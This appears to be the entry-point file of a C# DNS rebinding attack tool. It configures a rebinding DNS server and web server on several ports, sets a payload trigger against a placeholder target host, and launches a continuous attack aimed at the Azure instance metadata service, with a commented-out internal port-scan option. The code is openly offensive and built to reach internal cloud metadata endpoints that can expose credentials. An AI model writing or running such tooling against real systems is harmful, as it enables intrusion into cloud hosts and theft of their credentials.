using System;
using System.Threading.Tasks;

namespace RebindMeta
{
	public class Program
	{
		public static async Task Main()
		{
			string dnsSuffix = ".dnsrebind.mysite.local";
			string bindIp = "10.0.x.x";
			string publicIp = "1x.2xx.3x.4x";
			// Pick a few, but for a range use PortRemap
			int[] webserverPorts = new[] { 80, 8080, 8910, 44248 };

			Uri targetHost = new Uri("http://<TargetForPayloadTrigger>/");

			AttackTarget target = AttackTargets.AzureIMDS;

			RebindDnsServer dnsServer = new RebindDnsServer(bindIp, publicIp, dnsSuffix);
			RebindWebServer webServer = new RebindWebServer(dnsServer, bindIp, webserverPorts);
			PayloadTriggerBase trigger = new ContosoFinancialErrorPagePayloadTrigger(targetHost);

			ContinuousAttack attack = new ContinuousAttack(dnsServer, webServer, trigger);
			PortscanAttack portscanAttack = new PortscanAttack(dnsServer, webServer, trigger);

			await Task.WhenAny(
				dnsServer.RunAsync(), 
				webServer.RunAsync(), 
				attack.Attack(target) // You can also remove the attack if you want to trigger externally
				//portscanAttack.Attack(target, 80, 10000),
			);
		}
	}
}
